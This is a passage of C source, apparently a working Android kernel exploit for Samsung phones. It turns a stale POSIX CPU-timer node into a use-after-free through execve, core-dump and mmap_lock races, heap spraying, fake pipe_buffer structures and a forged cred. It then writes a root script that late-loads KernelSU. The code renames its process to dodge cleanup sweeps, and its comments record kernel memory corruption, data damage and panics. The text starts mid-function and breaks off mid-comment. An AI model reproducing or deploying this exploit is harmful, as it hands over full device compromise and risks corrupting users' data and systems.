    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        logf("[base-diag] made=%d timer_allocs(c)=%d order1_pfn(rn)=%d page_alloc_id=%u\n",
             made, c, rn, g_t_page_alloc);
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

/*
 * Drain the posix_timers_cache SLUB partial list.  If the victim slab stays
 * on the partial list instead of returning to the buddy allocator, our
 * order-1 reclaim can never land on it.  Freeing every held timer and then
 * churning a large batch (alloc+free) empties the partial slabs so the next
 * freed victim slab goes back to the buddy, where the spray picks it up.
 */
static void drain_timers(void)
{
    struct sigevent ev;
    static timer_t tmp[4096];

    if (g_prefill)
    {
        for (int i = 0; i < PREFILL_TIMERS; i++)
            timer_delete(g_prefill[i]);
        free(g_prefill);
        g_prefill = NULL;
    }
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < 1024; i++)
        timer_create(CLOCK_MONOTONIC, &ev, &tmp[i]);
    for (int i = 0; i < 1024; i++)
        timer_delete(tmp[i]);
}

static void *g_dump_pad;
static size_t g_dump_pad_len;

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    /*
     * A large populated anonymous mapping makes the helper's core dump
     * slow enough to keep mm->core_state set while the exec thread walks
     * de_thread() -> exec_mmap().  Without it the dump can finish first
     * and the late timer cleanup runs.
     */
    /*
     * 256 MiB with THREE dumpers staggered 700 ms apart is the configuration
     * the port notes record as the only one that reliably produced
     * `marker verify read n=8 val=0x1122334455667788` and
     * `umh bootstrap write n=8` on this device:
     *
     *   "150 ms delay + 256 MiB pad + 3 dumpers | the configuration that
     *    works: marker verify read n=8 ... twice, umh bootstrap write n=8"
     *
     * A later pass raised this to 512 MiB + 8 dumpers at a 250 ms stagger and
     * the abort rate collapsed: recent boots report `core dump: 0 bytes` and
     * `comm=timer` (the exec thread is killed in userspace before de_thread,
     * the ordinary exit path cleans the timerqueue, and no stale node is
     * left).  The 8-dumper variant serialises badly in do_coredump() and the
     * 512 MiB MAP_POPULATE costs residency under memory pressure, so the
     * measured-good triple is used instead of the unmeasured guess.
     */
    g_dump_pad_len = 256UL << 20;
    g_dump_pad = mmap(NULL, g_dump_pad_len, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (g_dump_pad == MAP_FAILED)
        g_dump_pad = NULL;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, (off_t)len))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        /*
         * Give every 4KB mapping a distinct file offset.  With a shared
         * offset=0 they are mergeable: the first mprotect() coalesces all
         * 50000 VMAs into one and later iterations hold the mmap_lock for
         * almost no time, so exec_mmap()'s trylock always wins the race.
         * Distinct offsets keep the VMA tree fragmented, making every
         * mprotect() walk 50000 entries while holding mmap_lock.
         */
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd,
                 (off_t)i * PAGE) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    /*
     * Hold mmap_lock in write mode for a long, controlled interval.
     * mprotect() over the fragmented range only holds it for ~1-2 ms
     * (measured on this device), which exec_mmap()'s trylock wins almost
     * every time: a 128 MB MAP_POPULATE mmap holds the write lock for
     * ~80 ms while the kernel allocates and zeroes the pages.  exec_mmap()
     * then takes the killable slowpath; the pending SIGKILL from the
     * 6.1 trigger used to abort it, but this kernel only has the
     * uncontended exec_update_lock, hence the core-dump helper above.
     */
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    /*
     * 64 MiB with a 150 ms breather between cycles.  The abort needs
     * core_state set when exec_mmap() takes mmap_read_lock(old_mm), so the
     * lockers only have to keep the write lock busy around that moment --
     * but they were cycling 128 MiB back to back (~6 GB/s of page
     * allocation and zeroing with four of them), which saturates the
     * allocator: plants took 7 s to abort, and one run died with a
     * watchdog-style reset right after "early page_free seen".
     * 64 MiB holds the lock ~40 ms; with the breather four lockers still
     * cover most of the time, at a fraction of the churn.
     */
    size_t hold = 64UL << 20;
    (void)x;
    /* CPUs 1,3,4,5: never the exec thread (2) or the coredump helper. */
    pin((int)slot + 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        void *p = mmap(NULL, hold, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

        if (p != MAP_FAILED)
            munmap(p, hold);
        atomic_fetch_add(&g_locker_iters, 1);
        usleep(150000);
    }
    _exit(0);
}
static _Atomic int g_dumper_slot;

static int coredumper_fn(void *x)
{
    (void)x;
    unsigned slot = (unsigned)atomic_fetch_add(&g_dumper_slot, 1);
    /* Keep off CPU 2 (the exec thread); use 1/3 alternately. */
    pin((slot & 1) ? 3 : 1);
    /*
     * Start only at g_core_go (locker steady state, immediately before
     * execve) so the 1 GB dump covers exec_mmap instead of finishing
     * during the locker wait.  g_go alone produced no-zombie/exec-alive
     * misses because the dump was already over.
     */
    while (!atomic_load(&g_core_go))
        ;
    /* Stagger the crashes so one core dump is always queued/active while
     * the exec thread walks de_thread -> exec_mmap.  do_coredump() serialises
     * on mm->core_state, so later dumpers wait and start as soon as the
     * previous one ends.  700 ms is the spacing the port notes record
     * together with the 256 MiB pad and three dumpers ("two dumpers are
     * staggered by 700 ms"); a tighter 250 ms stagger with eight dumpers is
     * what collapsed the window to 0 bytes. */
    usleep((useconds_t)(slot * 700000));
    {
        struct rlimit rl = {RLIM_INFINITY, RLIM_INFINITY};

        (void)setrlimit(RLIMIT_CORE, &rl);
        (void)prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
    }
    logf("[coredump] slot %u crashing to hold mm->core_state\n", slot);
    *(volatile int *)0 = 1;
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

/*
 * Borrowed from the s928b branch (`killer_fn`), which is the only abort
 * mechanism their exploit needs: 2 mprotect lockers on a fragmented range, a
 * killer that spins next to the exec thread, and `si_code == CLD_KILLED` as
 * the success criterion -- no core dump, no pad.  Here it is added *on top*
 * of the core-dump trigger rather than replacing it, because this port's
 * abort reason is `exec_mmap()` seeing core_state (the disassembly puts
 * posix_cpu_timers_exit() directly after that call), and 5.15 takes
 * exec_update_lock with mutex_lock_interruptible, not _killable.
 *
 * What it does give us: the child always dies from a signal, so a plant can
 * never sit in the 15 s window waiting for a spinning leader thread, and the
 * comm gate below can tell the two cases apart.
 */
static int killer_fn(void *x)
{
    int tid, tgid;

    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);

        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    /*
     * Wait before killing the group.  ESRCH fires the moment de_thread()
     * swaps the pids, i.e. *before* begin_new_exec() reaches exec_mmap(),
     * and a group SIGKILL there aborts the exec early: the late
     * posix_cpu_timers_exit() then runs from the exit path after all, the
     * timerqueue is clean, the reap writes nothing and pipe->bufs keeps
     * pointing at the real array (the verify read came back "n=1 val=0x41",
     * the prime's own byte).  The stale node only exists when the exec gets
     * all the way to exec_mmap() and fails there, which takes ~2.6 s; the
     * SIGKILL is only cleanup, so give it that much room.
     */
    usleep(3000000);
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    /*
     * Let the holders reach steady state: the first MAP_POPULATE mmap can
     * take a while, and starting execve while they are still queueing was
     * the reason trylock kept succeeding.  Two completed rounds prove the
     * lockers are cycling through mmap/munmap and one of them is holding
     * mmap_lock in write mode almost continuously.
     */
    while (atomic_load(&g_locker_iters) < 2)
        sched_yield();
    /*
     * Start the core-dump helpers only now: they used to crash at g_go,
     * before the locker steady-state wait, so the 512 MB dump could finish
     * before begin_new_exec() reached exec_mmap().  Three staggered
     * dumpers now cover the post-hit window.
     */
    unlink("core");   /* let the next measurement see the dump appear */
    atomic_store(&g_core_go, 1);
    /*
     * 150 ms: long enough that this thread is well inside execve() when the
     * dumper zaps the mm (a dumper that kills it in userspace produces
     * CLD_KILLED with comm="timer" and a clean timerqueue -- verify read n=1
     * val=0x41), and short enough that measured exec_mmap() arrival stays
     * inside the dump window.  This is the timing that produced the marker
     * verify (n=8, MARK_MAGIC) and the bootstrap merge (n=8) on the device;
     * both the "no delay at all" and the CoreDumping handshake experiments
     * came out worse.
     */
    usleep(150000);
    logf("[exec] lockers_started=%d locker_iters=%lu\n",
         atomic_load(&g_locker_started),
         (unsigned long)atomic_load(&g_locker_iters));
    /*
     * Re-exec ourselves with an empty argv[0]; the new image exits 42 in
     * main(), so a failed abort is a clean retryable exit.  The abort
     * itself comes from the core-dump helper holding mm->core_state while
     * begin_new_exec() reaches exec_mmap().
     */
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static long now_ms(void);

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    /*
     * A/B switch for the trigger: SAMTIMER_NO_DUMP=1 drops the dump pad and
     * the three coredumpers, leaving exactly the s928b shape (lockers that
     * hold mmap_lock + the killer that SIGKILLs the group the moment
     * de_thread() swaps the pids).  If plants still report comm=yexec in this
     * mode, the kernel has an interruptible point between de_thread() and
     * exec_mmap() and the pad can be deleted; if every plant reports
     * comm!=yexec, a pending SIGKILL cannot abort there and core_state stays
     * the only way (which is what the disassembly suggests).
     */
    int no_dump = getenv("SAMTIMER_NO_DUMP") != NULL;

    if (no_dump)
        logf("[plant] no-dump mode: lockers + killer only\n");
    else
    {
        long t0 = now_ms();

        if (prepare_fragmented_range())
            _exit(110);
        logf("[plant] prep=%ldms pad=%dMiB vmas=%d\n", now_ms() - t0,
             (int)(g_dump_pad_len >> 20), VMA_COUNT);
    }
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (!no_dump)
        /*
         * Three dumpers: the measured-good configuration (see
         * prepare_fragmented_range).  Eight dumpers at a 250 ms stagger
         * produced `core dump: 0 bytes` and `comm=timer` on every recent
         * plant, i.e. the exec thread was killed in userspace before
         * de_thread() and the timerqueue was cleaned on the ordinary exit
         * path, leaving no stale node for the erase.
         */
        for (int i = 0; i < 3; i++)
            if (spawn_vm_helper(coredumper_fn) < 0)
                _exit(112);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(113);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static void drop_caches_root(void)
{
    int fd;

    if (getuid() != 0)
        return;
    fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (fd >= 0)
    {
        (void)write(fd, "2", 1);
        close(fd);
        logf("[+] root drop_caches after abort\n");
    }
}

/*
 * Measure the core dump while waiting for the zombie.  The abort depends on
 * mm->core_state still being set ~2.6 s after g_core_go, and the dump's
 * duration is what decides that -- but until now it was guessed from the pad
 * size (0.4 s vs 2 s across boots).  The core file in the child's cwd is
 * visible from here, so record how long its size keeps changing: that is the
 * dump window, measured per plant instead of inferred.
 */
static void core_probe(long *first_ms, long *last_ms, long long *bytes)
{
    struct stat st;

    if (stat("core", &st) != 0 || st.st_size <= 0)
        return;
    if (*first_ms < 0)
        *first_ms = now_ms();
    *last_ms = now_ms();
    if (st.st_size > *bytes)
        *bytes = st.st_size;
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    long cfirst = -1, clast = -1;
    long long cbytes = 0;

    for (int i = 0; i < 25000; i++)
    {
        if ((i % 50) == 0)
            core_probe(&cfirst, &clast, &cbytes);
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
        {
            /*
             * The zombie is often seen here (after the 4 s drain loop) and
             * not inside that loop, so the earlier hook never fired.  As
             * root, force empty slabs out of SLUB's partial list before
             * the spray needs the victim page back in the buddy allocator.
             */
            drop_caches_root();
            /* The slab page is now in buddy; release the tight phase 2. */
            atomic_store(&g_burst2, 1);
            core_probe(&cfirst, &clast, &cbytes);
            logf("[+] core dump: %lld bytes, window %ldms (from %ldms)\n",
                 cbytes, cfirst < 0 ? -1 : clast - cfirst,
                 cfirst < 0 ? -1 : cfirst);
            return 0;
        }
        nanosleep(&pause, NULL);
    }
    core_probe(&cfirst, &clast, &cbytes);
    logf("[+] core dump (timeout): %lld bytes, window %ldms\n", cbytes,
         cfirst < 0 ? -1 : clast - cfirst);
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void drain_spray(int fake);

/*
 * Detach the fake pipe_buffer array from the pipe before parking/exiting.
 * free_pipe_info() walks pipe->bufs[0..ring_size-1], calls
 * pipe_buf_release() on every slot whose ops is set, and then kfree()s the
 * array.  While pipe->bufs still holds our (user or reclaimed-slab) page,
 * both steps are wrong: the releases would put_page() unrelated kernel
 * pages and kfree() would take a foreign address.  Zero the ops of our
 * slots first, then put the original array back.
 */
static void pipe_restore(void)
{
    static const unsigned long long zero = 0;

    /*
     * Only meaningful when the last mode-6 plant installed writable
     * (CAN_MERGE) descriptors: with the read-only verify layout the
     * pipe_write below would take the buffer-allocation path instead of
     * merging at pipe->bufs, so claiming a restore would be a lie and the
     * pool could then be drained while bufs still points into it.
     */
    if (g_pipe_restored || !g_pipe_write || g_safe_wfd < 0 || !g_safe_page ||
        g_safe_page == (unsigned char *)MAP_FAILED || !g_pipe_bufs)
        return;
    for (int i = 0; i < 16; i++)
        *(unsigned long long *)(g_safe_page +
                                (size_t)i * PIPE_BUF_FAKE_OFF + 0x10) = zero;
    int n = user_pipe_write(g_safe_wfd, g_safe_page,
                            g_pipe_addr + PIPE_INFO_BUF_OFF,
                            &g_pipe_bufs, sizeof(g_pipe_bufs));

    if (n == (int)sizeof(g_pipe_bufs))
    {
        g_pipe_restored = 1;
        g_keep_bufs = 0;   /* bufs is back on the real array */
        logf("[+] pipe->bufs restored to %#llx\n", g_pipe_bufs);
    }
    else
        logf("[!] pipe->bufs restore failed (n=%d); pool stays allocated\n",
             n);
}

/* Read the first bytes of core_pattern (root-readable) for the write test. */
static void read_core_pattern(char *out, size_t n)
{
    int fd = open("/proc/sys/kernel/core_pattern", O_RDONLY);

    out[0] = 0;
    if (fd < 0)
        return;
    if (read(fd, out, n - 1) < 0)
        out[0] = 0;
    close(fd);
    for (size_t i = 0; out[i]; i++)
        if (out[i] == '\n')
        {
            out[i] = 0;
            break;
        }
}

static void reset_core_pattern(void)
{
    int fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);

    if (fd >= 0)
    {
        (void)write(fd, "core", 4);
        close(fd);
    }
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    /* Detach the stale CPU-timer queues while the victim task_struct is
     * still alive.  A later init reap then walks empty trees instead of a
     * node in a reclaimed page. */
    safe_unlink_held();
    /* Then give the pipe back its own buffer array: the fakery must not
     * outlive the primitive (see pipe_restore). */
    pipe_restore();
    /*
     * Stop the vm helpers before sleeping: the lockers spin mprotect loops
     * pinned to CPUs 1/3 and the killer spins tgkill on CPU 2, and a parked
     * parent never reaps them.  Left running they starve the softdog kthread
     * and the phone panics with "Software Watchdog Timer expired 100s"
     * a few minutes later.  g_stop ends the mprotect loop; exec_tid=1 makes
     * the killer's tgkill fail with ESRCH (no such tid in the target) so it
     * takes its exit path instead of spinning forever.
     */
    atomic_store(&g_exec_tid, 1);
    atomic_store(&g_stop, 1);
    /*
     * Release every spray page before sleeping.  A parked process holding
     * ~2GB of queued skb/pipe data starves kernel threads and the softdog
     * panics the phone ~100s later (verified twice in kmsg).  Freeing the
     * pages is safe here: caught payload pages are only needed until their
     * erase fires (run_plant drains those itself on every exit path), and
     * the one page that must survive -- the fake cred the root child runs
     * on -- is kept by the g_cred_live guard below.
     */
    if (!g_cred_live)
    {
        drain_spray(0);
        if (g_keep_bufs)
            logf("[!] keep pool held: pipe->bufs may still point into it\n");
        else
            drain_spray(1);
    }
    /*
     * Survive the caller's teardown.  Shizuku kills the whole process
     * group when the UserService is unbound, and an interactive adb shell
     * sends SIGHUP on disconnect.  Either death reparents the held
     * zombies to init, which reaps them -- release_task() then runs
     * cleanup_timerqueue() on their stale nodes, which sit inside pages
     * the drain just freed and the allocator already handed out again.
     * That use-after-free write corrupts arbitrary live kernel data
     * (observed: system-wide app kills, damaged on-disk file metadata,
     * panic).  Detach into our own session and ignore the catchable
     * termination signals; only SIGKILL or the reboot that reverts
     * everything may end this holder.
     */
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    (void)setsid();
    /* Drop the obvious exploit name so cleanup sweeps do not target us. */
    (void)prctl(PR_SET_NAME, "ksuhelperd", 0, 0, 0);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    /*
     * Single node at `off` only.  The frag page_offset is 0 (verified in
     * disasm), so the node lands exactly at V+0x78.  Do NOT tile at a 0x18
     * stride in mode 2: the extra parent/target pairs land inside the fake
     * cred (egid/fsuid +0x18, session_keyring +0x58, process_keyring +0x60,
     * request_key_auth +0x70) and the child oopses the moment it reads its
     * cred.  A memset-0 remainder is safe: rb_next() on a zeroed node
     * returns NULL, so the posix-cpu-timers exit loop still terminates.
     */
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/*
 * One fake pipe_buffer slot at `o`.  PIPE_BUF_FAKE_OFF (0x28) is
 * sizeof(struct pipe_buffer) on this build (BTF: page 0x00, offset 0x08,
 * len 0x0c, ops 0x10, flags 0x18, private 0x20, size 0x28) and is also the
 * slot stride inside pipe->bufs, so slot k lives at base + k*0x28.
 */
static void fill_fake_pipe_buf(unsigned char *base, size_t o,
                               unsigned long long spage, unsigned int poff,
                               unsigned int len, unsigned int flags)
{
    *(unsigned long long *)(base + o + 0x00) = spage;
    *(unsigned int *)(base + o + 0x08) = poff;
    *(unsigned int *)(base + o + 0x0c) = len;
    *(unsigned long long *)(base + o + 0x10) =
        ANON_PIPE_BUF_OPS_STATIC + g_slide;
    *(unsigned int *)(base + o + 0x18) = flags;
}

/* Final stage: hand the root child off to KernelSU (ksud late-load).
 * Shape copied verbatim from BuSung-dev/Root-My-Galaxy-Payloads
 * su_daemon.c:run_kernelsu_late_load -- the upstream flow verified across
 * the supported Samsung fleet (fusion-s24u inherited it from them):
 *   - ksud late-load --package-name <manager>
 *     (no --allow-shell: su must come from the manager app only;
 *      no --ephemeral: this ksud keeps its full late-load install;
 *      no --kmi: ksud picks its embedded module from the running kernel)
 *   - executed through the /system/bin/logcat bind mount the C side set up
 *     in a private mount namespace (Android 16+ KDP SIGKILLs a directly
 *     exec'ed kdp-variant ksud); the namespace dies with this worker, so
 *     the bind mount never outlives the stage
 *   - NO manual SELinux re-enforce: RootMyGalaxy's exploit leaves
 *     permissive on success (root.c "selinux left" path) and never
 *     restores it from userspace.  Our earlier manual re-enforce raced
 *     ksud's own restore and killed system_server on OneUI 8 ("failed to
 *     set system property" crash loop -> UI restart -> panic).
 *   - NO daemon start, NO --version probe (a direct ksud exec gets
 *     KDP-killed and only adds "Killed" noise), NO pm/find ladder.
 *
 * --package-name must name the manager that is actually installed.  The
 * libksud.so in jniLibs is built from diabl0w/KernelSU, whose manager
 * package is me.weishu.kernelsu (its own strings reference
 * "#/me.weishu.kernelsu.ui.MainActivity").  A stale name from another lineage
 * (com.rifsxd.ksunext, KernelSU-Next) leaves the driver without a manager uid,
 * so the manager app can never be granted su even when the module loaded. */
static void write_ksu_script(void)
{
    (void)mkdir("/data/local/tmp/samtimer", 0777);
    static const char script[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\"\n"
        "echo \"[ksu] ctx=$(cat /proc/self/attr/current 2>/dev/null)\"\n"
        /* The parent only frees the spray pool (the forged cred lives in
         * one of those pages) when this marker reads "done". */
        "echo pending > /data/local/tmp/samtimer/cleanup.ok\n"
        /* Safe-mode toggle: read the app's SharedPreferences XML directly
         * (DirtyFrag pattern) instead of a relay marker the app stages --
         * one source of truth, nothing to stage or race, the state is live
         * at stage time.  The pref is absent until the user first toggles
         * the switch, so untouched installs get no side effects; value
         * true blocks (disable flag in every module dir + parked script
         * dirs), an existing-but-false pref restores.  A bad module or a
         * service.d script boot-loops the device, so this runs first, in
         * the forged root (init) context, even before the late-load -- if
         * the load fails anyway the markers still land and the next boot
         * is clean.  The kernelsu module dir itself is never disabled --
         * the chain re-establishes root every boot via late-load and does
         * not depend on the dir.  (CE prefs: readable once the user is
         * unlocked, which the 3-minute settle window makes the norm.) */
        "PF=/data/user/0/com.roottimer.app/shared_prefs/roottimer_prefs.xml\n"
        "if [ -r \"$PF\" ] && grep -q 'safe_mode' \"$PF\" 2>/dev/null; then\n"
        "  if grep -q '<boolean name=\"safe_mode\" value=\"true\"' \"$PF\"; then\n"
        "    if [ -d /data/adb/modules ]; then\n"
        "      for d in /data/adb/modules/*/; do\n"
        "        id=${d%/}; id=${id##*/}\n"
        "        [ \"$id\" = kernelsu ] && continue\n"
        "        touch \"${d}disable\"\n"
        "        echo \"[safe] module disabled: $id\"\n"
        "      done\n"
        "    fi\n"
        "    for s in post-fs-data.d service.d; do\n"
        "      [ -d \"/data/adb/$s\" ] && mv \"/data/adb/$s\" \"/data/adb/$s.disabled-by-samtimer\" && echo \"[safe] $s parked\"\n"
        "    done\n"
        "    echo '[safe] modules + script dirs blocked'\n"
        "  elif grep -q '<boolean name=\"safe_mode\"' \"$PF\"; then\n"
        "    for d in /data/adb/modules/*/; do\n"
        "      rm -f \"${d}disable\"\n"
        "    done\n"
        "    for s in post-fs-data.d service.d; do\n"
        "      [ -d \"/data/adb/$s.disabled-by-samtimer\" ] || continue\n"
        "      if [ -d \"/data/adb/$s\" ]; then\n"
        "        cp -r \"/data/adb/$s.disabled-by-samtimer/.\" \"/data/adb/$s/\"\n"
        "        rm -rf \"/data/adb/$s.disabled-by-samtimer\"\n"
        "      else\n"
        "        mv \"/data/adb/$s.disabled-by-samtimer\" \"/data/adb/$s\"\n"
        "      fi\n"
        "      echo \"[safe] $s restored\"\n"
        "    done\n"
        "    echo '[safe] modules + script dirs restored'\n"
        "  fi\n"
        "fi\n"
        "KSUD=/data/adb/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/samtimer/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
        "echo \"[ksu] ksud=$KSUD size=$(stat -c %s \"$KSUD\" 2>/dev/null)\"\n"
        /* Version marker for the app's status card (matches "version=ksud").
         * Through the bind mount only: a direct ksud exec is KDP-killed.
         * The C side sets the mount up before this script runs. */
        "V=$(/system/bin/logcat --version 2>/dev/null | head -1)\n"
        "case \"$V\" in *ksud*|*kernelsu*) echo \"[ksu] version=$V\" ;; esac\n"
        /* late-load registers the module asynchronously; probe with a
         * settle delay like the reference does (sleep before grep). */
        "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null "
        "&& echo yes || echo no; }\n"
        "LIVE=$(live)\n"
        "echo \"[ksu] live_initial=$LIVE\"\n"
        "if [ \"$LIVE\" = yes ]; then\n"
        "  echo '[ksu] already_live'\n"
        /* Nothing new was spawned with the forged cred on this path. */
        "  echo done > /data/local/tmp/samtimer/cleanup.ok\n"
        "  exit 0\n"
        "fi\n"
        /* If the C-side bind mount worked, /system/bin/logcat IS ksud
         * (KDP-safe path).  Real logcat never prints ksud/KernelSU.
         * No --ephemeral: the e1s pair's ksud does not have that option
         * (verified: late-load --help lists only magica/allow-shell/
         * post-magica/kmi/package-name); plain late-load performs the
         * full install, which is the device-tested flow for these pairs. */
        "if /system/bin/logcat --version 2>/dev/null | "
        "grep -qiE 'ksud|kernelsu'; then\n"
        "  echo '[ksu] bind mount active, exec via logcat path'\n"
        "  /system/bin/logcat late-load "
        "--package-name me.weishu.kernelsu\n"
        "  RC=$?\n"
        "else\n"
        "  echo '[ksu] no bind mount; direct exec (KDP may kill)'\n"
        "  \"$KSUD\" late-load "
        "--package-name me.weishu.kernelsu\n"
        "  RC=$?\n"
        "fi\n"
        "echo \"[ksu] late-load rc=$RC\"\n"
        "i=0\n"
        "while [ $i -lt 50 ]; do\n"
        "  grep -q '^kernelsu ' /proc/modules && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if grep -q '^kernelsu ' /proc/modules; then "
        "echo '[ksu] module live'; else echo '[ksu] module NOT live'; fi\n"
        /*
         * Cleanup -- the forged cred (a node in the reclaimed spray page)
         * is inherited by anything forked from this worker, including the
         * ksud daemon the late-load stages spawn.  The parent frees the
         * spray pool after this script returns, so a survivor would keep
         * a cred pointer into freed memory -- touched later it corrupts
